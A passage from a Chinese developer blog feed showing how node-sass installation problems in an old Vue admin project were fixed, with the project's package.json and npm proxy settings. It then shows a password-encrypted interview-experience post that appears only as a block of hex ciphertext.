title="单装某依赖node-sass为例"></a>单装某依赖node-sass为例</h3><p>这个项目很老，所以在node版本以及依赖安装上出了点问题。</p><p>参考<a href="https://blog.csdn.net/Newz0722/article/details/107046127">https://blog.csdn.net/Newz0722/article/details/107046127</a></p><p>对于package.json中的script对象，可以使用nvm run+操作来运行，比如npm run dev/build/preinstall</p><p>[Node.js环境的平台（<code>win32</code>），架构（<code>x64</code>），和内部模块版本（<code>57</code>）] 8.9.4对应57内核太老了，node-sass ^7.0.1官方github未提供编译好的版本，考虑替换node版本更高，或者用Dart-Sass（即sass，流行于vite和webpacket）取代node-sass(但是需要修改项目代码中的引用)</p><p><code>npm uninstall node-sass</code></p><p><code>npm install sass --save-dev</code></p><p>所以这里从8.9.4<strong>切换为node14.16.1</strong>版本，win32-x64-83，下载node格式文件，</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;mall-admin-web&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;mall后台管理前端&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;macro&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;private&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;dev&quot;</span>: <span class="string">&quot;webpack-dev-server --inline --progress --config build/webpack.dev.conf.js&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;start&quot;</span>: <span class="string">&quot;npm run dev&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;build&quot;</span>: <span class="string">&quot;node build/build.js&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;preinstall&quot;</span>: <span class="string">&quot;node -p \&quot;[process.platform, process.arch, process.versions.modules].join(&#x27;-&#x27;)\&quot; &quot;</span> </span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;ali-oss&quot;</span>: <span class="string">&quot;^6.3.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;axios&quot;</span>: <span class="string">&quot;^0.18.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;echarts&quot;</span>: <span class="string">&quot;^4.5.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;element-ui&quot;</span>: <span class="string">&quot;^2.3.7&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;js-cookie&quot;</span>: <span class="string">&quot;^2.2.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;normalize.css&quot;</span>: <span class="string">&quot;^8.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;nprogress&quot;</span>: <span class="string">&quot;^0.2.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;qrcodejs2&quot;</span>: <span class="string">&quot;^0.0.2&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;v-charts&quot;</span>: <span class="string">&quot;^1.19.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;v-distpicker&quot;</span>: <span class="string">&quot;^1.0.20&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;vue&quot;</span>: <span class="string">&quot;^2.5.2&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;vue-baidu-map&quot;</span>: <span class="string">&quot;^0.21.22&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;vue-json-excel&quot;</span>: <span class="string">&quot;^0.2.98&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;vue-quill-editor&quot;</span>: <span class="string">&quot;^3.0.6&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;vue-router&quot;</span>: <span class="string">&quot;^3.0.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;vuex&quot;</span>: <span class="string">&quot;^3.0.1&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;autoprefixer&quot;</span>: <span class="string">&quot;^7.1.2&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;babel-core&quot;</span>: <span class="string">&quot;^6.22.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;babel-helper-vue-jsx-merge-props&quot;</span>: <span class="string">&quot;^2.0.3&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;babel-loader&quot;</span>: <span class="string">&quot;^7.1.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;babel-plugin-syntax-jsx&quot;</span>: <span class="string">&quot;^6.18.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;babel-plugin-transform-runtime&quot;</span>: <span class="string">&quot;^6.22.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;babel-plugin-transform-vue-jsx&quot;</span>: <span class="string">&quot;^3.5.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;babel-preset-env&quot;</span>: <span class="string">&quot;^1.3.2&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;babel-preset-stage-2&quot;</span>: <span class="string">&quot;^6.22.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;chalk&quot;</span>: <span class="string">&quot;^2.0.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;copy-webpack-plugin&quot;</span>: <span class="string">&quot;^4.0.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;css-loader&quot;</span>: <span class="string">&quot;^0.28.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;extract-text-webpack-plugin&quot;</span>: <span class="string">&quot;^3.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;file-loader&quot;</span>: <span class="string">&quot;^1.1.4&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;friendly-errors-webpack-plugin&quot;</span>: <span class="string">&quot;^1.6.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;html-webpack-plugin&quot;</span>: <span class="string">&quot;^2.30.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;node-notifier&quot;</span>: <span class="string">&quot;^5.1.2&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;node-sass&quot;</span>: <span class="string">&quot;^7.0.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;optimize-css-assets-webpack-plugin&quot;</span>: <span class="string">&quot;^3.2.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;ora&quot;</span>: <span class="string">&quot;^1.2.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;portfinder&quot;</span>: <span class="string">&quot;^1.0.13&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;postcss-import&quot;</span>: <span class="string">&quot;^11.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;postcss-loader&quot;</span>: <span class="string">&quot;^2.0.8&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;postcss-url&quot;</span>: <span class="string">&quot;^7.2.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;rimraf&quot;</span>: <span class="string">&quot;^2.6.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;sass-loader&quot;</span>: <span class="string">&quot;^4.0.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;semver&quot;</span>: <span class="string">&quot;^5.3.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;shelljs&quot;</span>: <span class="string">&quot;^0.7.6&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;svg-sprite-loader&quot;</span>: <span class="string">&quot;^3.7.3&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;uglifyjs-webpack-plugin&quot;</span>: <span class="string">&quot;^1.1.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;url-loader&quot;</span>: <span class="string">&quot;^0.5.8&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;vue-loader&quot;</span>: <span class="string">&quot;^13.3.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;vue-style-loader&quot;</span>: <span class="string">&quot;^3.0.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;vue-template-compiler&quot;</span>: <span class="string">&quot;^2.5.2&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;webpack&quot;</span>: <span class="string">&quot;^3.6.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;webpack-bundle-analyzer&quot;</span>: <span class="string">&quot;^2.9.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;webpack-dev-server&quot;</span>: <span class="string">&quot;^2.9.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;webpack-merge&quot;</span>: <span class="string">&quot;^4.1.0&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;engines&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;node&quot;</span>: <span class="string">&quot;&gt;= 6.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;npm&quot;</span>: <span class="string">&quot;&gt;= 3.0.0&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;browserslist&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;&gt; 1%&quot;</span>,</span><br><span class="line">    <span class="string">&quot;last 2 versions&quot;</span>,</span><br><span class="line">    <span class="string">&quot;not ie &lt;= 8&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>npm config list</p><p>npm config set proxy 127.0.0.1:10808</p><p>npm config delete proxy</p><p>npm config set proxy <a href="http://127.0.0.1.10809/">http://127.0.0.1.10809</a> <strong>安装cnpm</strong>，为什么不从淘宝安装？因为淘宝源SSL证书过期，所以直接<strong>从node.org安装</strong>，但是需要<strong>配置http代理</strong></p><p>cnpm install 一次性<strong>安装完node-sass</strong>@^7.0.1没有报错（因为直接下载的二进制编译好的，之前npm有报错github网络问题相关，如果set proxy应该也能处理好）</p><h2 id="项目代码"><a href="#项目代码" class="headerlink" title="项目代码"></a>项目代码</h2><p>见github </p>]]></content>
      
      
      <categories>
          
          <category> AI算法 </category>
          
          <category> 课设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> YOLO </tag>
            
            <tag> 全栈开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蚂蚁天穹实验室面试经验</title>
      <link href="2023/11/30/diary/exp_interview-231130/"/>
      <url>2023/11/30/diary/exp_interview-231130/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ffad772a377def558a23a18d5aad92f8324b74b2c0c2dd3ad40f02a7ef0f85f0">9d80d7a3e6754c1ccc4e665275ac808357f4673a972ed7e40f9d7faebfb690bea3e9aa393f0a0eea2b7871a816410a399878581b6d04c7f956974fc92e3cf4e9ced3a3ccec9a140d763c90c17b868a2b8f697e867475a250a6f2b969572b6c41431238f941433b8001c35aab5d694d3365d47eec2b83b1253ede24e59472824d1bbd4753f4e880146c7998f09a8ea81e164c2b13bf3cfe5c9ffde44f6bab2d05c5f24724b18879aea79f8ff73c22a69ed1315e0628c7007ef735c011d4934aa63b550458c8563852d82fccf200b26e5f019c7628b782cd04881f97980cf45241b7abd009a0fe1323de1a03ee0c361a3b4c4e3e88266bcdca1bb481fc61e862bf324868aea0015c9a5907d344f2595aa6603e2a7d12784c487c20fe91ae5df651ed0fc4de15f246b7e5940341993e225faba6825eea09516a7a7368628e8c44c13b768314535ee203c5f673d61a06b36c99e9aaa1aba57a33d16f3767283b9be84adefe866934b5c4289c6253fe64c562203936a283c7500de6d3d5eec3c658ad540ace3c8dac5a57ec13f3787518118c95b70a8e21a11b37b153731f7dff9c0a68286ae5ded87dfe45b638ff9481b4ea64d543086d5042ca11b07b0dc36becdd926b2381ee53e8c76b425974953db3a30d188a74d521a9955769a3d119a6339f3f8a26187d44f687c8014cd6737fcae1c4442916d7f437470678a28201bee9f4362d3dd4b908e754e2603e22ec1d087ab337a0378dd39a0be66b4894f7da86b53ac6fe709b549e7bbf015b7ed2654d9bbca0a0d60d0711e929095558e97e92ca5c16804611aa8131cfb7f70daf764a9f774e802c8c68dde779199264e71cfb72dbbe328943a7b94ee229d4cb672a92882879f7ccd755436f81c2a2193308994fb1b1076caa45153d102b2a20415a7bb7d82e7c34c1d1d2fb8d9bb32e554ff127cd36177ffd6df74134f1ba3886a4f745d04d29a61faeea7fbca95e679cf3588648ee5f6246ce69e95469138e863c64fbe494ef936ad3308b71a37dfa1784fb44ecd2d30d5c1861da99758df9d1eb1a8c26f0f85eb9c424d652f7a638ab82a8d2c79c5fd26348580d736cc031391d68a21054cdd0627581aa07f824411ec65f8d188dcb9fe9e27c5b0d3e4398122a59e0bb241e6f008b410a607f3d5418eb04bcb2d37ccc60a35226804d7d74ab25faeaa4b57ff16b44b62937d82c1acb93ef163294c800d7398ea526b1ff83d87610826e3fe6fc9b5db704c18d14ebf7a0fe8710ef9d233f75b0423d2db54ab309e056dfd19578df00fc2d24a4437347563d04ad0935a2bac64b3a89960dbd88f88850bbb2f15e0ce37a629ba04d28d59fc0056779da71ea11f24001228724acf18e30325e4061c35805d5a281db02b941ba1b1e916f885d958fe525cf9b77a2ac81cfdd4bbd7daea4996d9054de45ad4d1971db008e93410998876acd793b7facec5ccc673ddcc6a8eb4762de47d84fe60a56c066f3d72760a9337b0bfcc9179f79ae7b2b70ddc0a1a85be8f6663bb7e71e14d485554dfc90f64a420504543db32f2867cda62def298a44c167201d31c2229dd06e988dea8dd5ea53c68c1f39dfa126f6a800ad6261d468aceb2514f7b923d116c8de587ca6edf0a5e74767015ee698e8254a110878e77867dc50c0071a69e0ef9bf2042e31e5ef73ffb5997709f1f1275b4a5a6c1432c50e722a0130c7d49a90f9c198a315d2566aadf112b6f067fe138729d38b36fa0e56d1b7c2d8da9158d16562b523744faad14456b3546ba4792fd10261c36f66b16df2de233f9084b4daef763fefb52fb1621f6d7cfdc4f9a1cdc7f2beed953ed417c759c8e4ccc52500dbca86b7c2c42f9fb7660bebf0b77b07b95e082df6b7901837f1ef8fbc39ca1af6bf7de714452f05990f191881dbcffc0cee3436429c6c0682c16f9f3c49d0f949a2d5a75bd1135d15b4690b79fe34dcda163c1392f43b30007966390055c17c5bfaaad7cd46f45bd5d52d076614cf40876cbe4002c5efbb8e84314a0829b77b6d8f1aca86f7c99e1340965405a6ac2f19f7b1f10f1975ab0c31dbfa33fd8d4c564936527379cf6f6d888ad8b828a6ce62228ffacefef297655cd38edb3c5bd6d6108f1e7147684483a04f05dd2a759cc6cd307e583c3ed092ffaab8a2d3bf86705763b78304828495cce45c4b8316e02f0adb1930f53f4e88a5be6065f29650fba1e595ab8614f8597ded2b5a2e3d55971807ff730322f69de2156f87c7647dadb067abe0d4704e017549920a2fecac09da5471f0b1809e39671602754ebcdbb527002a51b0d9a0df3d28add1e938647ae569edd4eb8e2d80c3887377b1c4cb46d6034666534b27bf2d16e510032663d8f5bef95239eaae7d542443e86c374efe96c329a8cb79861f252237c1412ad19759d6453655dcaa5ffa19b877836702cb4f9cd989a38c6d1484027bba4e02612567c672017a1eb3641248537896d98a8e45b6b1bd5cf62a3f5d6dec4f54af4418ea4ebdded57c4c8f6a413b417f05037d2d5c759951562878d78ef55e4fb0d4d1457ac724d289989da26859faa93c9ce65d22bd936e1024ee3142a67cf7ec75ad0449480c7b6d0e2c9bcfc810e57d43bd94ab7d5968a932af660f8db60e62caafdb9354822b40b7aa6beb62421a972944879a7fa1164fe12c8222ea184ea67b4878a88d7be07f963af219a92f76b21387631d967367670a8579cc1bebaedf93fce1807b2a13bc6d492ea8bf82685ffe12008f2f7bddee1cfdc326e7b1c9d5f0665e31b8dd78ba69647d1044f2520557457aaf1dcdb4d0eca29800457c5c10a640cac092e14ffbdca76a09d9aca3393acbfc9fea28e58a1cbf70da71e9b6b8f12abfd9fad04b25fd9fee5a03e40731650b5d81b055230ccb631b3b77c67c2c8e39aa2cf01983cc72e9d5a2e217621599fc6f356bb6bcf832944cdc108d66d734d8301e4c811036cd7a2db3c101477b02096e5288299803348a277b0d8701ddb9aed74cf894bf7f27f1f39701cb5fed5b185ec55e9c65973de7925e580d6063811951af3b55c0c6963115638bd2f32463bffc45a9d1a8f49cf0f3db6389774ae6a1f781b5c7f6bd4950572ce42e632e8ae81a1ca5e18938ad3746b1d8972954df027fc33108b1d60acdf9028ecf6e3cf5cb08cf712369db1d9d7eb7c2bae447e70605c7cdbbcc71b16124fca739c96a44e7e0197f8e2d43c57c9bbf7670555129f19511daf2cd417c869a6b21dd0898a994bf8c256021eaefa6a6b5b622654e7d05cb9ce3e9e9b29dabd4360920198f7b44443d484b1007dc237915d0f5da645fbbc5b7fcbc9b8d87216806037ea9faf2cf892337cd084f493f558a7ff61425dbdeb48d63eb79547d0b84050147a05b2db37b1bc76d86c0dfd89e10d55ca4876c04b123d3130d26298ace98111a99dfb3f5a0fa78fa8a9ad728ecf37cc82a2affa331ec88cadb3ba6f7d57214abf7e1a20a34f4e4a2d83364dead65ecdcb4bcd360edea5edf8c2abad4136637e5070d440fd4a180cc5dc2bc12bfa7ffe2d6ce6dd3a2eb91a36a00427d8d94cb23d4af3ee701c39284ad2dfe460526a1bf365308db9f0f0a10747e8bfa9ad691c0c801f5064cdc23283f3b7ba623f0e0998815afb4bf8f540ccf96739d1a6081fe44aaeeb43fda22f7e4dadc489f934207b6c6a7a24c8afa7218e1a645574f8d45f849f14020b8c6167e7c5ce4f2f2142853d30d287f10be05994f9065d33453807d53bf6944ba51acddbe9f6ea769af67997d182da5c587488a777ea33a88ac758c48d6ad3c7c762bece0d3cc8dde19ee5d795d0c8a59e1293435cce50dcc4f67cb7e9e0f04dedee3af8218d4e6429056cd37d143bc8dcdc662a71ae35803eb0c3f5037d3aabcc2e865f79f3d9077d36a0417cdf6c1a4b2fc923cd58f10b2cf6fa6397c7c4e980b00a3344e5ac38ccfd2effec5976fcf4380ee8be5442c1445d79019835846b23538f848f98fbf93c4175d3d94f97b16c1fcdec0ba260b588a24476d6f28b63c305f07c2ca1a0c730a3d3f780a0f83ecf167ca3d45a2e51e59524312a4796d79c3b5273752801061611d0537106d4b441c9353fc6cc14de1c1f5a8462ffea54911c441abbc8516cafd94d628c99a227ceb0de7934d17fb330331c4a191340f60d48d06bfedbd5f8fe4bba5906c0cd679e1368283414aa071d33f19e89a3f28459f533b7cccceb485207fc82ea15331a4607f823cfae096d4c4bb46da6b955d744b2dac5bab5dd23393cef2e5a8fded5041f9bf6a75576a3e58d597d5a11bec728c607155f9ead9ac8b3bad366f1bd30594966ee83ca7282da8cbdb46e1fb019d87ae9e5cf26169f3abd3e047b4f7ce28190ca5c3bff0367959cf83b0de69c7de7bcab5fbf48e87085b1c9cbdf1ac337b2eca287a364dbdd8de73f340a0fbf2e7cb2cfe026ad37228c05686aa016770a005d4832261712ad0801c9e5749b42c5bebda27451cb4c604fa94f5186b9b7051dc560d10a64bb65729693add84e2003380b42fbeceb6bbbe4f48270dfe072a25457b27b9e2ac35dcc9de1962f56b09c0f41147f0e9270e77fee65edb82680c8d2ad01aebc6edfb97d570077de999f8d2dbf398dc834c927cba90f9732ebb87dc1d41e4cbd37fb76dcbdf9a2c62f6bc935aa56f84007904a0e8bcfc81b37682c54504bea7b98dc4d9d54b2309e794dd83d57de773e4a183ace0d5fe7773f156cec60afedad4d873f19f4e27cc712a6645dd90bf1d4ad4aaeef48cf093eead26a1569dcf9fa279528e3d30db166cf2f27ce501cbfab03d95eb08a7047a11edb40d14ffe22ec0d05718cd8a9e500fd5f25db7c6f3d1c3f67142ce3bb737e42739eb72ca5ddbd08a6bb17f662604c2911b1d0f7f72ad7b096d1b6adc2a481b591ceafb8a11655fc7fd7d794d89827d3de4ae90fd3c13fc32448d253035070aa08c41d701d07ba8f86525a3c21ca1127821bb9476b043fe29f85cdcdae77edae11c888895d6f832ed99c7093b8ed54e5e4eb7bf81d539e6c043b66354cc8b98703dcc3307071e1f34a3d41843e7810dae35519bf78ec9ce59244d639bc059dfaddbd76d4606b5db20c0fc2b3cd1dd113c98c4e56e12185ae1c81e44f44b6b37abd214d5a0d65903baf496e4994f192e6e2bab09114f0838dbcfeb1907af7ce50f801adf12fa92a006ff397895bc18139c5376111e62ec276d3af6217f0639c4309eed3ff52d0742bc8abf81750d1ecca7286e71c38b7d3159ac7c5e18a982ff2caa6cc2caf3f73d07e7c7355d8005359d5d3241013429ad32c1d72c79e196a4fa25b15b8ccd5dea8cb55935a1635868ab0dfc9f359e4ff564eddeafc464b6e0c16ce43006d21faed089900906cb3eb8cdc47c3a147bef7e05ad7c1e597e4deb7aaa5b5a3e7e43d1c6d7baaee23e829a04096c01b437bb16b8bfe84b510915e1dc82859ffdd491ef6ebf0533938cc9e06985bcfda3454b895b9003deb7e1f0a7690aa757f18ef3e662f6cfaf449ff836ed8a9cd3339c334f0cfba0a0d2c4151af407469cd617b7e9f4c8a27eec7cd372112264e8da26fad8bdb8dbbbf562fd3dc64089aa88abcd82c967a60f6e779a982d84e88baf0ac3090ebd191b21f4c532bcb855f06617df9196334ae652ec9b501d5441ab021b0172036e1a4a1c0d5f7cca09050687bc0b86f04b75bf9529a63563d853965525f758356ebc93ef97f0a343cbf3284b6b70353a46d779c3cf0ad13dc5ce811d0aa9a8406501d4910d72d58ea37361bce7494b7f64dea217968f14ad0067f7719a983a0d13f74da4c29e1cf509fa1a5daa665ffa3cdffd46a2018e0025eb58333ad775e7c7b25cb14b290380c8ecfe2990115a249e67718f8e24eb7395971d7dcfddb6862ebdf13c05b878bcfb7f4da4e534d49fffe1706a3c69ad79295ac6b8f393db06961ccce2f70c9cc1be4c58f09ea9d222f6aac87ffd5758afed8cb746b0996a92717a8966fdb444c701ba038c91d148e9c98491c2452ee5934b47981cb1b78a8d17b27f4548eb2698ea51a4a554c0de42023a7e4d058b69c2ae5f99275e8310833f6392ce4ca079351a46ba35ed969039eb2b07848233353c323043774a7ce3a95d51413feee927d678752d4feca5fcf6b229cc61c39164290fac3035596da8d5e224214f3a3c24f318552cf9d58719c36bae9e49cabe85cba678df6fb4cea14f7a673ccf16412a584c5882e43d0b1148d3ffb2cc1219a3f4300dc10bca0ae3bda9c7563105fd643181544d3caa8e887ec77a1b9e0371f633cd21b3ce405f1d3ef3b273a822c738022e655b860cfba88869bb9536e88155b981d0c526c872b5b30877e3e9425040aaf91959fce97c827022b4ca005872a9fb2757082948174d5c23e31724ea3cba89ae2894e7fb6f90be281c8c226f18e286ece803c6cee3e55dc044e2c76ce9ff4f37c32a972cf40db6c4a3b3308206f624a1590fc90a9ed51db6c64baf3d84f3f8e9436215afd36dcbd5d25ef768107743edd3ca3f47a5b50acc1cf72a9b7051fdf863279902682ee9db5b8f3883d1a90de09f17eb43905238a28d6d587fb527a01ef46630d5dd7db975438591706f2706f2312de6d66921e4de0c8a7d658291a5733afaea6a5a1d5bb0777155a2e1710b2c92fc0c7cc9844059e69bb5aee62692bc6718a3420cc26072824e9bd13c4c76e6a2f00f03ceb890c6507d26bf45f4f84ca2b164c4aacb979651f807f1e09371a231dcb7dd17164c871e9b29a86af5db5958377818d93a03d33c1e253bf98b09db3e472e331230f02f26aeac320c7168394fbe7b10e0b13b49b9afaadc267183c8a9c63203845a844dcdb8c4d3e13d115a9369a515fe684393a34e43e04644d07b2183978f34c2896468bb9ede96257974662b74769db8f9bf72fb906175a7105d1679a5c6e3569c81adb60ef4b5102433e14a0aee26e549a1124a0d9796be53e9a179b853a21da669a67967a6ccbe68ff1ae6edc02068d1176bdc8eb4748cd8b1e994909807bbfa09e1fca19ae2645236a64da63ecdc145a9142b08ef28e0821bd5228a21eeea679bc6cc8d878682a2705e4e71f0316a582e99b7e71cdba5ec7205d00309c8e1a1438791aef3aaad3fa8bfcdd06aaa5b262421f93cd2ed3744e7163e5281a4fc1a3fa938fd21fa4db5d05c07472810f0b5554bf76176a276b7ee82f80f0060ae7285a090ede01a61c58f0be1cf7bb0df4e1edbf45ba50851e55262389101681c21f98656659248e0383974580615658ad7c9f8d875243053d52abce5c492dff5b672a299c746f2d909ede53b2bbf6922b30c8a6f627f3c07af2e46de2cf23028f92bf64ecf3d44ecbf8235397e88314ad6077a5297efe52a073de08d37bdf87e69d3a6ff17ddbbfbc0d3560e1d3951e00b3c1fc1284ef71ec6f465c95e1ff765660dd9066b2df0a316b3151966bd2fa7c84924fa55b0463504d10ad478024501c0ce3362679350a370be4fa434eb7267d8f8d5ffa1e68d610ec6c61150ea722dbce5864f1d15e428eb2570bc8c36005c2fbb5420540f27c038b8fa7bf8ac05ff69e1a23ba7b1aa0fce24b2bce59777db2151cafe6d6dfa3e4b21f4f3d24c00bdece1b705aa01dc63c57ed410dfaaefb17d55830c993e080de87ebff627fad38144929838d29adaf55841b7846a34bb726588f106f89b2ab9398568f87c6deb0477f45186fb227549577201fde03741621580e3c2a184c35bd9243a65a44583fedac910047ce4ce86b4b1463605d331cb2ad487ac937d6e9064b68d17932a59422e7b15a461b086af2b01c18d01594294e04e9f777707dea34f51cceb1072a4623209d65d463a44d76755ed70709d30b9e8bc1ad21e44ab50e9d924564725157b35d33cd5779b966f6853237709b583d5cace081ad381071eee93a3f3e3254f1c316a9ca58e709935020d3244bfa86063f00ebccaa62d2af981e53890e168429b54ca225eb34f10628225b0eff60e542893d99062efae562321a510d13494156730a97a8ea895aa2c2ed3d57451c9284164b8416a72d110638d30252498892d7e604ec52080d29391ecdf1bdaba1282c0967e75770cd6a0b5bbc4d1aa4ddbdc0f3aead7ad6f6b502b5f96f6376dc9f21ef6bc09a600dc2e1bd8e1324e8046b2fc607a1328aca4577dedc82cdfd89ee1ac3f16a11502c867aff1458f643558bf5f220fc4baca88ec39ae2343001863d2d2e3ad2edc5db5b912317c10b5d5c918fb5d8771ce1ce5c727ad911f78451cfa64f4d0bbf28bc6af520c7bac6c96f1314dbbbb1b4376d9cfe9a493f67303202114c0f958a31d64abd78554dbe3bd13e1e4b98955a87d85d6f4b68ba7d684a7cf2aaebfe4456f40d2f624bebf7eebc3abb0506788cba1f5d6cfd28f541fe8b313501a5d6cd490edbf7e894e9e182c1fbffd4bc481d122898d3cf49f94653ce6287bd4db20b2f33f6d8726fd87105c7b64037780ac5ad1be961dc065634db8c1664a21cb6f31f11ba5f0721f4b5256a435e8014b3f82d6de3be6fa0e0f8fc6ea746d3b33777cbba328ab4c294b080e0ff5d40bde6cc8bb8c1283001d45609666feb776af0fba03e1b90349a0dd1c6f5df5ce8e6bfed8c1c95d11290f86a1ac76ada1886c0873e618b571fd89c6e42b814a9cf85cf9501cb0c1ab378994173b200b5994cfd5fc7f2fbde1af637af3fba03bb314caa0fc71de8228c723083e9a3872da504d2d33eb70ed4e0f5c1ec62a1bf2fb0bb8ba4622632d74eccd5282f5bdbc2a44943abed5c1854b186045b914f07399345e662a69077e8629f5b70b12966068722b7b026d8b1db75f3420133cb3d303e41ca7f24fefd939bff495221b53f9fa501e48e559556e9da9e6e8267dc4a3bf63bb6733d895b113fd3a91fa313f3247a1fcf1cee111fbcc8d8399a900ddfa95cc0f87bc88fbd358d5382c5c79e82d5498935ce749f94993591baef03ba8dc040a6c68c19ab9f60d46c3da1b0855d4fb8eaf08305c41068888f760fd46f4d8b3968afb07a261dbab3009b2d4842189597d961b77c1f38c94b94757affed859f51d74256bf7a701b052e67a440cb97581937fee658b2cc7f7e017bedc1f2eed653bf9d2728a48b2a6e5d79f7127650c916184fbc1fd1be2c0f26abe6529a9bc2aa71ff79d734c4298778700dedbc761c987f39d8b08fd9bca5b39dc1af8e37db8ce735ea12b88b7467735a898cb840c6a672e87255cd6ce4a073b8cf73b3a3f0e5ef33bf1e1a2acf3936a9981583c2481f6285cf9a863431bea7705df5d6a7ee1d4a7ce2e07cead031f599bb3563f8